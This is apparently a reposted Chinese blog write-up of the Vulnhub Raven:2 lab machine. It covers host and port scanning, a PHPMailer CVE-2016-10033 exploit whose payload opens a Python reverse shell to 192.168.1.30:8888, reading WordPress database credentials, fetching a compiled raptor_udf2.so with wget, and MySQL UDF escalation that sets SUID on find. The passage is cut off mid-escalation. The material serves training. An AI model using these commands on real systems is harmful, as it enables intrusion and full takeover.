{"title":"Vulnhub Raven:2","date":"2018-12-03T22:10:14.000Z","date_formatted":{"ll":"Dec 3, 2018","L":"12/03/2018","MM-DD":"12-03"},"link":"/Vulnhub-Raven-2","updated":"2020-12-27T16:45:50.789Z","content":"<p>旧文搬运，原文地址:<a href=\"https://xz.aliyun.com/t/3474\">https://xz.aliyun.com/t/3474</a></p>\n<h1 id=\"主机发现\">主机发现<a title=\"#主机发现\" href=\"#主机发现\"></a></h1>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@kali:~<span class=\"comment\"># arp-scan -l</span></span><br><span class=\"line\">Interface: eth0, datalink <span class=\"built_in\">type</span>: EN10MB (Ethernet)</span><br><span class=\"line\">Starting arp-scan 1.9 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)</span><br><span class=\"line\">192.168.1.1\te0:45:6d:c8:43:79\t(Unknown)</span><br><span class=\"line\">192.168.1.32\t00:0c:29:12:96:8f\tVMware, Inc.</span><br><span class=\"line\">192.168.1.15\t08:d4:0c:85:f2:8c\tIntel Corporate</span><br><span class=\"line\">192.168.1.50\t70:85:40:a7:03:eb\t(Unknown)</span><br><span class=\"line\">192.168.1.51\t08:d4:0c:85:f2:8c\tIntel Corporate</span><br><span class=\"line\">192.168.1.69\t38:53:9c:99:f2:da\t(Unknown)</span><br><span class=\"line\">192.168.1.229\tf0:18:98:04:80:24\t(Unknown)</span><br><span class=\"line\">192.168.1.92\t28:fa:a0:9f:94:5f\t(Unknown)</span><br><span class=\"line\"></span><br><span class=\"line\">8 packets received by filter, 0 packets dropped by kernel</span><br><span class=\"line\">Ending arp-scan 1.9: 256 hosts scanned <span class=\"keyword\">in</span> 2.285 seconds (112.04 hosts/sec). 8 responded</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>在<code>192.168.1.32</code>发现靶机。</p>\n<a id=\"more\"></a>\n<h1 id=\"端口探测\">端口探测<a title=\"#端口探测\" href=\"#端口探测\"></a></h1>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@kali:~<span class=\"comment\"># nmap -A 192.168.1.32</span></span><br><span class=\"line\">Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-28 08:07 EST</span><br><span class=\"line\">Nmap scan report <span class=\"keyword\">for</span> Raven (192.168.1.32)</span><br><span class=\"line\">Host is up (0.00052s latency).</span><br><span class=\"line\">Not shown: 997 closed ports</span><br><span class=\"line\">PORT    STATE SERVICE VERSION</span><br><span class=\"line\">22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span><br><span class=\"line\">| ssh-hostkey: </span><br><span class=\"line\">|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:<span class=\"built_in\">fc</span> (DSA)</span><br><span class=\"line\">|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)</span><br><span class=\"line\">|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)</span><br><span class=\"line\">|_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)</span><br><span class=\"line\">80/tcp  open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class=\"line\">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class=\"line\">|_http-title: Raven Security</span><br><span class=\"line\">111/tcp open  rpcbind 2-4 (RPC <span class=\"comment\">#100000)</span></span><br><span class=\"line\">| rpcinfo: </span><br><span class=\"line\">|   program version   port/proto  service</span><br><span class=\"line\">|   100000  2,3,4        111/tcp  rpcbind</span><br><span class=\"line\">|   100000  2,3,4        111/udp  rpcbind</span><br><span class=\"line\">|   100024  1          59830/udp  status</span><br><span class=\"line\">|_  100024  1          60361/tcp  status</span><br><span class=\"line\">MAC Address: 00:0C:29:12:96:8F (VMware)</span><br><span class=\"line\">Device <span class=\"built_in\">type</span>: general purpose</span><br><span class=\"line\">Running: Linux 3.X|4.X</span><br><span class=\"line\">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class=\"line\">OS details: Linux 3.2 - 4.9</span><br><span class=\"line\">Network Distance: 1 hop</span><br><span class=\"line\">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class=\"line\"></span><br><span class=\"line\">TRACEROUTE</span><br><span class=\"line\">HOP RTT     ADDRESS</span><br><span class=\"line\">1   0.52 ms Raven (192.168.1.32)</span><br><span class=\"line\"></span><br><span class=\"line\">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class=\"line\">Nmap <span class=\"keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"keyword\">in</span> 8.37 seconds</span><br></pre></td></tr></table></figure>\n<p>发现<code>22</code>，<code>80</code>和<code>111</code>端口是开放的，其中<code>80</code>端口运行了一个web应用。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181130005547-9e7cc6f2-f3f7-1.png\" alt=\"image-20181128211837181-3411117.png\" class=\"φcx\"></p>\n<h1 id=\"目录猜解\">目录猜解<a title=\"#目录猜解\" href=\"#目录猜解\"></a></h1>\n<p>使用dirb进行目录扫描</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@kali:~<span class=\"comment\"># dirb http://192.168.1.32</span></span><br><span class=\"line\"></span><br><span class=\"line\">-----------------</span><br><span class=\"line\">DIRB v2.22    </span><br><span class=\"line\">By The Dark Raver</span><br><span class=\"line\">-----------------</span><br><span class=\"line\"></span><br><span class=\"line\">START_TIME: Wed Nov 28 08:20:15 2018</span><br><span class=\"line\">URL_BASE: http://192.168.1.32/</span><br><span class=\"line\">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class=\"line\"></span><br><span class=\"line\">-----------------</span><br><span class=\"line\"></span><br><span class=\"line\">GENERATED WORDS: 4612                                                          </span><br><span class=\"line\"></span><br><span class=\"line\">---- Scanning URL: http://192.168.1.32/ ----</span><br><span class=\"line\">==&gt; DIRECTORY: http://192.168.1.32/css/                                        </span><br><span class=\"line\">==&gt; DIRECTORY: http://192.168.1.32/fonts/                                      </span><br><span class=\"line\">==&gt; DIRECTORY: http://192.168.1.32/img/                                        </span><br><span class=\"line\">+ http://192.168.1.32/index.html (CODE:200|SIZE:16819)                         </span><br><span class=\"line\">==&gt; DIRECTORY: http://192.168.1.32/js/                                         </span><br><span class=\"line\">==&gt; DIRECTORY: http://192.168.1.32/manual/                                     </span><br><span class=\"line\">+ http://192.168.1.32/server-status (CODE:403|SIZE:300)                        </span><br><span class=\"line\">==&gt; DIRECTORY: http://192.168.1.32/vendor/                                     </span><br><span class=\"line\">==&gt; DIRECTORY: http://192.168.1.32/wordpress/</span><br></pre></td></tr></table></figure>\n<p>扫到几个一级目录，一个个查看下文件的内容。</p>\n<p>在<code>/vendor/</code>目录下发现了两个有趣的东西：</p>\n<p><code>http://192.168.1.32/vendor/PATH</code></p>\n<p>可以看到flag1和绝对路径。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181130005607-aa81a1a2-f3f7-1.png\" alt=\"image-20181128212618889-3411578.png\" class=\"φcx\"></p>\n<p><code>http://192.168.1.32/vendor/VERSION</code></p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181130005622-b3090996-f3f7-1.png\" alt=\"image-20181128212825140-3411705.png\" class=\"φcx\"></p>\n<p>同时目录下还存在一个<code> PHPMailerAutoload.php</code>的文件，配合起来看应该是使用了5.2.16版本的PHPMailer。</p>\n<h1 id=\"反弹shell\">反弹SHELL<a title=\"#反弹shell\" href=\"#反弹shell\"></a></h1>\n<p>然后<a href=\"https://www.exploit-db.com/\" target=\"_blank\">exploit-db.com</a>搜索一波，发现了这个exp：</p>\n<p><a href=\"https://www.exploit-db.com/exploits/40974\">https://www.exploit-db.com/exploits/40974</a></p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181130005712-d158916e-f3f7-1.png\" alt=\"image-20181128231552124-3418152.png\" class=\"φcx\"></p>\n<p>简单修改一下exp：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181130005728-da5d0f1a-f3f7-1.png\" alt=\"image-20181129003308948-3422788.png\" class=\"φcx\"></p>\n<ol>\n<li>\n<p>顶部加上<code># -*- coding: utf-8 -*-</code>声明，否则注释里一大堆非ASCII字符会报错。</p>\n</li>\n<li>\n<p>修改<code>target</code>为靶机IP地址，利用文件为<strong>contact.php</strong>。</p>\n</li>\n<li>\n<p>修改后门文件路径名称。也不知道为什么，用默认的<strong>backdoor.php</strong>总是利用不成功，把payload一顿瞎改还是不行，最后改成了<strong>shell.php</strong>居然就可以了=_=</p>\n</li>\n</ol>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181130005738-e04ab77e-f3f7-1.png\" alt=\"image-20181129003944898-3423184.png\" class=\"φcx\"></p>\n<ol start=\"4\">\n<li>修改反弹shell的地址为nc监听服务器的ip和端口。</li>\n</ol>\n<p>然后执行exp</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">~/Downloads</span><br><span class=\"line\">▶ python 40974.py</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"> █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗</span><br><span class=\"line\">██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗</span><br><span class=\"line\">███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝</span><br><span class=\"line\">██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗</span><br><span class=\"line\">██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║</span><br><span class=\"line\">╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝</span><br><span class=\"line\">      PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com</span><br><span class=\"line\"> Version 1.0 - github.com/anarcoder - greetings opsxcq &amp; David Golunski</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;MultipartEncoder: &#123;<span class=\"string\">&#x27;action&#x27;</span>: <span class=\"string\">&#x27;submit&#x27;</span>, <span class=\"string\">&#x27;message&#x27;</span>: <span class=\"string\">&#x27;Pwned&#x27;</span>, <span class=\"string\">&#x27;name&#x27;</span>: <span class=\"string\">&#x27;&lt;?php system(\\&#x27;</span>python -c <span class=\"string\">&quot;&quot;</span><span class=\"string\">&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\\\\&#x27;192.168.1.30\\\\\\&#x27;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\\&quot;</span>/bin/sh\\\\&quot;,\\\\&quot;-i\\\\&quot;]);<span class=\"string\">&quot;&quot;</span><span class=\"string\">&quot;\\&#x27;); ?&gt;&#x27;, &#x27;email&#x27;: &#x27;&quot;</span>anarcoder\\\\&quot; -OQueueDirectory=/tmp -X/var/www/html/backdoor.php server<span class=\"string\">&quot; @protonmail.com&#x27;&#125;&gt;</span></span><br><span class=\"line\"><span class=\"string\">[+] SeNdiNG eVIl SHeLL To TaRGeT....</span></span><br><span class=\"line\"><span class=\"string\">[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D</span></span><br><span class=\"line\"><span class=\"string\">[+]  ExPLoITeD http://192.168.1.32/contact.php</span></span><br></pre></td></tr></table></figure>\n<p>访问<strong>contact.php</strong>。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181130005754-ea0423f4-f3f7-1.png\" alt=\"image-20181129004215441-3423335.png\" class=\"φcx\"></p>\n<p>此时就会生成后门文件<strong>shell.php</strong>，开启nc服务器监听，访问靶机的<strong>shell.php</strong>，在服务器上得到反弹shell。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@kali:~<span class=\"comment\"># nc -lvvp 8888</span></span><br><span class=\"line\">listening on [any] 8888 ...</span><br><span class=\"line\">connect to [192.168.1.30] from Raven [192.168.1.32] 35173</span><br><span class=\"line\">/bin/sh: 0: can<span class=\"string\">&#x27;t access tty; job control turned off</span></span><br><span class=\"line\"><span class=\"string\">$ </span></span><br></pre></td></tr></table></figure>\n<p>查看一下文件，在<code>/wordpress/wp-config.php</code>得到数据库的密码。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ls</span><br><span class=\"line\">Security - Doc</span><br><span class=\"line\">about.html</span><br><span class=\"line\">contact.php</span><br><span class=\"line\">contact.zip</span><br><span class=\"line\">css</span><br><span class=\"line\">elements.html</span><br><span class=\"line\">fonts</span><br><span class=\"line\">img</span><br><span class=\"line\">index.html</span><br><span class=\"line\">js</span><br><span class=\"line\">scss</span><br><span class=\"line\">service.html</span><br><span class=\"line\">shell.php</span><br><span class=\"line\">team.html</span><br><span class=\"line\">vendor</span><br><span class=\"line\">wordpress</span><br><span class=\"line\">$ <span class=\"built_in\">cd</span> wordpress\t</span><br><span class=\"line\">$ ls</span><br><span class=\"line\">index.php</span><br><span class=\"line\">license.txt</span><br><span class=\"line\">readme.html</span><br><span class=\"line\">wp-activate.php</span><br><span class=\"line\">wp-admin</span><br><span class=\"line\">wp-blog-header.php</span><br><span class=\"line\">wp-comments-post.php</span><br><span class=\"line\">wp-config-sample.php</span><br><span class=\"line\">wp-config.php</span><br><span class=\"line\">wp-content</span><br><span class=\"line\">wp-cron.php</span><br><span class=\"line\">wp-includes</span><br><span class=\"line\">wp-links-opml.php</span><br><span class=\"line\">wp-load.php</span><br><span class=\"line\">wp-login.php</span><br><span class=\"line\">wp-mail.php</span><br><span class=\"line\">wp-settings.php</span><br><span class=\"line\">wp-signup.php</span><br><span class=\"line\">wp-trackback.php</span><br><span class=\"line\">xmlrpc.php</span><br><span class=\"line\">$ cat wp-config.php</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181130005801-ee5abed6-f3f7-1.png\" alt=\"image-20181129232849878-3505329.png\" class=\"φcx\"></p>\n<p>查看一下mysql的运行权限：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ps -ef|grep mysql</span><br><span class=\"line\">root        556      1  0 02:18 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe</span><br><span class=\"line\">root        925    556  0 02:18 ?        00:00:01 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/<span class=\"built_in\">log</span>/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306</span><br><span class=\"line\">www-data   1138   1123  0 02:29 ?        00:00:00 grep mysql</span><br></pre></td></tr></table></figure>\n<p>是以root的身份运行的，可以考虑通过mysql提权。</p>\n<h1 id=\"udf提权\">UDF提权<a title=\"#udf提权\" href=\"#udf提权\"></a></h1>\n<p>nc模式下的shell不支持su交互，先利用python提升到伪终端。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python -c <span class=\"string\">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>\n<p>然后登入mysql，交互正常。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181130005811-f452bfdc-f3f7-1.png\" alt=\"image-20181129233348091-3505628.png\" class=\"φcx\"></p>\n<p>接着就是利用提权exp的利用了。</p>\n<p><a href=\"https://www.exploit-db.com/exploits/1518\">https://www.exploit-db.com/exploits/1518</a></p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181130005824-fbf01c12-f3f7-1.png\" alt=\"image-20181130000716531-3507636.png\" class=\"φcx\"></p>\n<p>参照注释一步步走。</p>\n<ul>\n<li>编译生成so文件。</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@kali:~<span class=\"comment\"># gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.c -lc</span></span><br><span class=\"line\">root@kali:~<span class=\"comment\"># ls</span></span><br><span class=\"line\">40974.py  Documents  Music     Public         raptor_udf2.so  Videos</span><br><span class=\"line\">Desktop   Downloads  Pictures  raptor_udf2.c  Templates</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<ul>\n<li>从服务器下载so文件。</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">www-data@Raven:/var/www/html/wordpress$ <span class=\"built_in\">cd</span> /tmp</span><br><span class=\"line\"><span class=\"built_in\">cd</span> /tmp</span><br><span class=\"line\">www-data@Raven:/tmp$ wget 192.168.1.30/raptor_udf2.so</span><br><span class=\"line\">wget 192.168.1.30/raptor_udf2.so</span><br><span class=\"line\">converted <span class=\"string\">&#x27;http://192.168.1.30/raptor_udf2.so&#x27;</span> (ANSI_X3.4-1968) -&gt; <span class=\"string\">&#x27;http://192.168.1.30/raptor_udf2.so&#x27;</span> (UTF-8)</span><br><span class=\"line\">--2018-11-30 03:29:34--  http://192.168.1.30/raptor_udf2.so</span><br><span class=\"line\">Connecting to 192.168.1.30:80... connected.</span><br><span class=\"line\">HTTP request sent, awaiting response... 200 OK</span><br><span class=\"line\">Length: 19160 (19K) [application/octet-stream]</span><br><span class=\"line\">Saving to: <span class=\"string\">&#x27;raptor_udf2.so&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">raptor_udf2.so      100%[=====================&gt;]  18.71K  --.-KB/s   <span class=\"keyword\">in</span> 0s     </span><br><span class=\"line\"></span><br><span class=\"line\">2018-11-30 03:29:34 (286 MB/s) - <span class=\"string\">&#x27;raptor_udf2.so&#x27;</span> saved [19160/19160]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<ul>\n<li>执行sql语句，其中<code>dumpfile</code>的路径要根据前面进程列出来的plugin目录(plugin-dir=/usr/lib/mysql/plugin)改动一下。</li>\n</ul>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql<span class=\"operator\">&gt;</span> use mysql;</span><br><span class=\"line\">use mysql;</span><br><span class=\"line\">Reading <span class=\"keyword\">table</span> information <span class=\"keyword\">for</span> completion <span class=\"keyword\">of</span> <span class=\"keyword\">table</span> <span class=\"keyword\">and</span> <span class=\"keyword\">column</span> names</span><br><span class=\"line\">You can turn off this feature <span class=\"keyword\">to</span> <span class=\"keyword\">get</span> a quicker startup <span class=\"keyword\">with</span> <span class=\"operator\">-</span>A</span><br><span class=\"line\">Database changed</span><br><span class=\"line\"></span><br><span class=\"line\">mysql<span class=\"operator\">&gt;</span> <span class=\"keyword\">create</span> <span class=\"keyword\">table</span> foo(line <span class=\"type\">blob</span>);</span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> foo(line <span class=\"type\">blob</span>);</span><br><span class=\"line\">Query OK, <span class=\"number\">0</span> <span class=\"keyword\">rows</span> affected (<span class=\"number\">0.02</span> sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql<span class=\"operator\">&gt;</span> <span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> foo <span class=\"keyword\">values</span>(load_file(<span class=\"string\">&#x27;/tmp/raptor_udf2.so&#x27;</span>));       </span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> foo <span class=\"keyword\">values</span>(load_file(<span class=\"string\">&#x27;/tmp/raptor_udf2.so&#x27;</span>));</span><br><span class=\"line\">Query OK, <span class=\"number\">1</span> <span class=\"type\">row</span> affected (<span class=\"number\">0.01</span> sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql<span class=\"operator\">&gt;</span> <span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> foo <span class=\"keyword\">into</span> dumpfile <span class=\"string\">&#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;</span>;</span><br><span class=\"line\"><span class=\"operator\">&lt;</span><span class=\"keyword\">to</span> dumpfile <span class=\"string\">&#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;</span>;                         </span><br><span class=\"line\">Query OK, <span class=\"number\">1</span> <span class=\"type\">row</span> affected (<span class=\"number\">0.00</span> sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql<span class=\"operator\">&gt;</span> <span class=\"keyword\">create</span> <span class=\"keyword\">function</span> do_system <span class=\"keyword\">returns</span> <span class=\"type\">integer</span> soname <span class=\"string\">&#x27;raptor_udf2.so&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">function</span> do_system <span class=\"keyword\">returns</span> <span class=\"type\">integer</span> soname <span class=\"string\">&#x27;raptor_udf2.so&#x27;</span>;</span><br><span class=\"line\">Query OK, <span class=\"number\">0</span> <span class=\"keyword\">rows</span> affected (<span class=\"number\">0.00</span> sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql<span class=\"operator\">&gt;</span> <span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> mysql.func;</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> mysql.func;</span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">-----------+-----+----------------+----------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span> name      <span class=\"operator\">|</span> ret <span class=\"operator\">|</span> dl             <span class=\"operator\">|</span> type     <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">-----------+-----+----------------+----------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span> do_system <span class=\"operator\">|</span>   <span class=\"number\">2</span> <span class=\"operator\">|</span> raptor_udf2.so <span class=\"operator\">|</span> <span class=\"keyword\">function</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">-----------+-----+----------------+----------+</span></span><br><span class=\"line\"><span class=\"number\">1</span> <span class=\"type\">row</span> <span class=\"keyword\">in</span> <span class=\"keyword\">set</span> (<span class=\"number\">0.00</span> sec)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<ul>\n<li>利用自定义函数改变命令权限</li>\n</ul>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> do_system(<span class=\"string\">&#x27;chmod u+s /usr/bin/find&#x27;</span>);</span><br></pre></td></tr></table></figure>\n<p>然后就可以利用<code>find</code>顺利提权了。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">www-data@Raven:/tmp$ touch finn</span><br><span class=\"line\">touch finn</span><br><span class=\"line\"></span><br><span class=\"line\">www-data@Raven:/tmp$ id</span><br><span 